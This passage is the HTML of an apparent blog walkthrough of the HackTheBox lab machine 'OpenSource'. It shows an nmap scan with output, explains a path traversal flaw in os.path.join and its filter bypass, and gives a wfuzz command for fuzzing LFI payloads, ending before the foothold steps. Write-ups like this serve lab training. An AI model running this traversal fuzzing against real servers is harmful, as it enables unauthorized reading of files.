@@ -1,0 +1,967 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox - OpenSource - Saad Akhtar</title><meta name="Description" content="HackTheBox easy linux machine OpenSource walkthrough."><meta property="og:title" content="HackTheBox - OpenSource" />
+<meta property="og:description" content="HackTheBox easy linux machine OpenSource walkthrough." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/hackthebox-opensource/" /><meta property="og:image" content="/hackthebox-opensource/0.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-05T19:00:21+05:00" />
+<meta property="article:modified_time" content="2022-10-05T19:00:21+05:00" /><meta property="og:site_name" content="Saad Akhtar" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/hackthebox-opensource/0.png"/>
+<meta name="twitter:title" content="HackTheBox - OpenSource"/>
+<meta name="twitter:description" content="HackTheBox easy linux machine OpenSource walkthrough."/>
+<meta name="application-name" content="Saad Akhtar">
+<meta name="apple-mobile-web-app-title" content="Saad Akhtar"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="favicon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/hackthebox-opensource/" /><link rel="prev" href="/hackthebox-timelapse/" /><link rel="next" href="/hackthebox-trick/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox - OpenSource",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/hackthebox-opensource\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/hackthebox-opensource\/0.png",
+                            "width":  1388 ,
+                            "height":  1058 
+                        }],"genre": "posts","keywords": "hackthebox, machines","wordcount":  1982 ,
+        "url": "\/hackthebox-opensource\/","datePublished": "2022-10-05T19:00:21+05:00","dateModified": "2022-10-05T19:00:21+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Saad Akhtar"
+            },"description": "HackTheBox easy linux machine OpenSource walkthrough."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - OpenSource</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://ssaadakhtarr.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Saad Akhtar</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-10-05">2022-10-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1982 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;10 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackthebox-opensource/0.png"
+        data-srcset="/hackthebox-opensource/0.png, /hackthebox-opensource/0.png 1.5x, /hackthebox-opensource/0.png 2x"
+        data-sizes="auto"
+        alt="/hackthebox-opensource/0.png"
+        title="HackTheBox easy linux machine OpenSource walkthrough." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#analyzing-the-source-code">Analyzing the Source Code</a>
+          <ul>
+            <li><a href="#cracking-the-pin">Cracking the PIN</a></li>
+            <li><a href="#manipulating-the-viewspy">Manipulating the views.py</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ul>
+        <li><a href="#analyzing-the-internal-network">Analyzing the internal network</a></li>
+        <li><a href="#exposing-the-internal-port">Exposing the Internal Port</a></li>
+        <li><a href="#finding-the-leaked-credentials">Finding the leaked credentials</a></li>
+        <li><a href="#reading-the-private-ssh-key">Reading the private SSH key</a></li>
+        <li><a href="#usertxt">user.txt</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#analyzing-the-processes">Analyzing the processes</a></li>
+        <li><a href="#understading-the-git-hooks">Understading the git hooks</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
+        <li><a href="#roottxt">root.txt</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This post is focused on the walkthrough of Easy Linux Machine OpenSource from HackTheBox.</p>
+<h2 id="summary">Summary</h2>
+<p>OpenSource from HackTheBox is an Easy Linux Machine. We get initial foothold on a <code>docker</code> container by overwriting a file and adding a custom route by taking advantage of the insecure usage of <code>os.path.join</code> function. From there we identify an unknown service running on one of the internal servers. We expose that service which leads to another website in which we log in by using the leaked credentials in one of the <code>git</code> commits and finally get the <code>user</code> via a private ssh key on the website. Taking advantage of auto commiting <code>git</code> processes running as <code>root</code>, we manipulate the <code>git hooks</code> and gain shell as <code>root</code>.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Starting out with the initial nmap scan.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad👻ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/opensource<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -A -vv 10.10.11.164 -oN nmapN
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE    SERVICE REASON      VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOm3Ocn3qQzvKFsAf8u2wdkpi0XryPX5W33bER74CfZxc4QPasF+hGBNSaCanZpccGuPffJ9YenksdoTNdf35cvhamsBUq6TD88Cyv9Qs68kWPJD71MkSDgoyMFIe7NTdzyWJJjmUcNHRvwfo6KQsVXjwC4MN+SkL6dLfAY4UawSNhJZGTiKu0snAV6TZ5ZYnmDpnKIEZzf/dOK6bBu4SCu9DRjPknuZkl7sKp3VCoI9CRIu1tihqs1NPhFa+XnHSRsULWtQqtmxZP5UXbmgwETxmpfw8M9XcMH0QXr8JSAdDkg2NtIapmPX/a3hVFATYg+idaEEQNlZHPUKLbCTyJ
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLA9ak8TUAPl/F77SPc1ut/8B+eOukyC/0lof4IrqJoPJLYusbXk+9u/OgSGp6bJZhotkJUvhC7k0rsA7WX19Y8<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxEEb33GC5nT5IJ/YY+yDpTKQGLOK1HPsEzM99H4KKA
+</span></span><span class="line"><span class="cl">80/tcp   open     http    syn-ack     Werkzeug/2.1.2 Python/3.10.3
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Wed, <span class="m">06</span> Jul <span class="m">2022</span> 15:49:02 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">5316</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;upcloud - Upload files <span class="k">for</span> Free!&lt;/title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;/static/vendor/jquery/jquery-3.4.1.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;/static/vendor/popper/popper.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;/static/vendor/bootstrap/js/bootstrap.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;/static/js/ie10-viewport-bug-workaround.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/vendor/bootstrap/css/bootstrap.css&#34;</span>/&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34; /static/vendor/bootstrap/css/bootstrap-grid.css&#34;</span>/&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34; /static/vendor/bootstrap/css/bootstrap-reboot.css&#34;</span>/&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   HTTPOptions: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Wed, <span class="m">06</span> Jul <span class="m">2022</span> 15:49:02 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Allow: GET, OPTIONS, HEAD
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   RTSPRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="s2">&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;Content-Type&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;text/html;charset=utf-8&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;Error response&lt;/title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;body&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;p&gt;Error code: 400&lt;/p&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;p&gt;Message: Bad request version <span class="o">(</span><span class="s1">&#39;RTSP/1.0&#39;</span><span class="o">)</span>.&lt;/p&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/body&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    &lt;/html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: upcloud - Upload files <span class="k">for</span> Free!
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET OPTIONS HEAD
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span class="line"><span class="cl">3000/tcp filtered ppp     no-response
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Starting with port 80 we have a website.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/1.png" title="Website on port 80" data-thumbnail="/hackthebox-opensource/1.png" data-sub-html="<h2>Website</h2><p>Website on port 80</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/1.png"
+            data-srcset="/hackthebox-opensource/1.png, /hackthebox-opensource/1.png 1.5x, /hackthebox-opensource/1.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/1.png" width="1366" height="578" />
+    </a><figcaption class="image-caption">Website</figcaption>
+    </figure></p>
+<p>Scrolling further down, we have a download option to download the source code of the web.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/2.png" title="Downloading the source code" data-thumbnail="/hackthebox-opensource/2.png" data-sub-html="<h2>Downloading the source code</h2><p>Downloading the source code</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/2.png"
+            data-srcset="/hackthebox-opensource/2.png, /hackthebox-opensource/2.png 1.5x, /hackthebox-opensource/2.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/2.png" width="1366" height="581" />
+    </a><figcaption class="image-caption">Downloading the source code</figcaption>
+    </figure></p>
+<p>Below the <code>Download</code> button, there&rsquo;s also a <code>Take me there!</code> button which opens up a file upload page.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/3.png" title="Take me there button" data-thumbnail="/hackthebox-opensource/3.png" data-sub-html="<h2>Take me there button</h2><p>Take me there button</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/3.png"
+            data-srcset="/hackthebox-opensource/3.png, /hackthebox-opensource/3.png 1.5x, /hackthebox-opensource/3.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/3.png" width="1366" height="581" />
+    </a><figcaption class="image-caption">Take me there button</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/4.png" title="File Upload Page" data-thumbnail="/hackthebox-opensource/4.png" data-sub-html="<h2>File Upload Page</h2><p>File Upload Page</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/4.png"
+            data-srcset="/hackthebox-opensource/4.png, /hackthebox-opensource/4.png 1.5x, /hackthebox-opensource/4.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/4.png" width="1366" height="561" />
+    </a><figcaption class="image-caption">File Upload Page</figcaption>
+    </figure></p>
+<p>Testing out the functionality, we can upload a file and then it provides us with the link to download that file.</p>
+<p>Since we got the source code, let&rsquo;s review it now.</p>
+<h3 id="analyzing-the-source-code">Analyzing the Source Code</h3>
+<p>From here, there are two paths to get the foothold on the machine. The first is to exploit the <code>werkzeug debug console</code> by cracking the pin. We can crack the pin by taking advantage of the LFI vulnerability in the source code. But sadly I couldn&rsquo;t get the console even though I cracked the PIN. I heard others cracked it and got access to the console, so looking forward to reading those writeups.</p>
+<p>The other method is to overwrite the <code>views.py</code> file again by taking advantage of the <code>LFI</code>.</p>
+<h4 id="cracking-the-pin">Cracking the PIN</h4>
+<p>Since the <code>werkzeug debug console</code> is enabled on the website at <code>http://opensource.htb/console</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/22.png" title="werkzeug debug console" data-thumbnail="/hackthebox-opensource/22.png" data-sub-html="<h2>werkzeug debug console</h2><p>werkzeug debug console</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/22.png"
+            data-srcset="/hackthebox-opensource/22.png, /hackthebox-opensource/22.png 1.5x, /hackthebox-opensource/22.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/22.png" width="1360" height="574" />
+    </a><figcaption class="image-caption">werkzeug debug console</figcaption>
+    </figure></p>
+<p>We can take advantage of <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug" target="_blank" rel="noopener noreffer ">this</a> exploit to crack the PIN.</p>
+<p>You can also <a href="https://youtu.be/jwBRgaIRdgs" target="_blank" rel="noopener noreffer ">watch</a> John Hammond&rsquo;s detailed video on this exploit referred to me by @ARZ.</p>
+<p>For the exploit to work we need the following mentioned values from the server.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/23.png" title="Exploit Values" data-thumbnail="/hackthebox-opensource/23.png" data-sub-html="<h2>Exploit Values</h2><p>Exploit Values</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/23.png"
+            data-srcset="/hackthebox-opensource/23.png, /hackthebox-opensource/23.png 1.5x, /hackthebox-opensource/23.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/23.png" width="899" height="313" />
+    </a><figcaption class="image-caption">Exploit Values</figcaption>
+    </figure></p>
+<p>How will we get these values? Through <code>LFI</code>.</p>
+<p>Looking at the <code>views.py</code> file, there&rsquo;s a route defined to get the uploaded files from the server which uses the <code>path.join</code> function.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/24.png" title="uploaded files route" data-thumbnail="/hackthebox-opensource/24.png" data-sub-html="<h2>uploaded files route</h2><p>uploaded files route</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/24.png"
+            data-srcset="/hackthebox-opensource/24.png, /hackthebox-opensource/24.png 1.5x, /hackthebox-opensource/24.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/24.png" width="1335" height="90" />
+    </a><figcaption class="image-caption">uploaded files route</figcaption>
+    </figure></p>
+<p>Going through <a href="https://blog.0xgodson.me/2022-04-09-path-traversal-via-join/" target="_blank" rel="noopener noreffer ">this</a> article, when we provide an absolute path starting with <code>/</code> the <code>os.path.join</code> behaves differently as shown below.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/21.png" title="path.join" data-thumbnail="/hackthebox-opensource/21.png" data-sub-html="<h2>path.join</h2><p>path.join</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/21.png"
+            data-srcset="/hackthebox-opensource/21.png, /hackthebox-opensource/21.png 1.5x, /hackthebox-opensource/21.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/21.png" width="724" height="179" />
+    </a><figcaption class="image-caption">path.join</figcaption>
+    </figure></p>
+<p>Source: <a href="https://blog.0xgodson.me/2022-04-09-path-traversal-via-join/" target="_blank" rel="noopener noreffer ">https://blog.0xgodson.me/2022-04-09-path-traversal-via-join/</a></p>
+<p>We can see on the <code>utils.py</code> file that it is removing the <code>../</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/5.png" title="Upload Filtering" data-thumbnail="/hackthebox-opensource/5.png" data-sub-html="<h2>Upload Filtering</h2><p>Upload Filtering</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/5.png"
+            data-srcset="/hackthebox-opensource/5.png, /hackthebox-opensource/5.png 1.5x, /hackthebox-opensource/5.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/5.png" width="1345" height="136" />
+    </a><figcaption class="image-caption">Upload Filtering</figcaption>
+    </figure></p>
+<p>We can fuzz the payloads to bypass this filtering and read files from the server.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/opensource]
+</span></span><span class="line"><span class="cl">└─$ wfuzz -c -w LFI\ payloads.txt  -u http://opensource.htb/uploads/FUZZ -t 100 --hc 404,500,308
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-opensource/25.png" title="Fuzzing for LFI" data-thumbnail="/hackthebox-opensource/25.png" data-sub-html="<h2>Fuzzing for LFI</h2><p>Fuzzing for LFI</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/25.png"
+            data-srcset="/hackthebox-opensource/25.png, /hackthebox-opensource/25.png 1.5x, /hackthebox-opensource/25.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/25.png" width="1334" height="469" />
+    </a><figcaption class="image-caption">Fuzzing for LFI</figcaption>
+    </figure></p>
+<p>Now we can use any of the working payloads to read files from the server.</p>
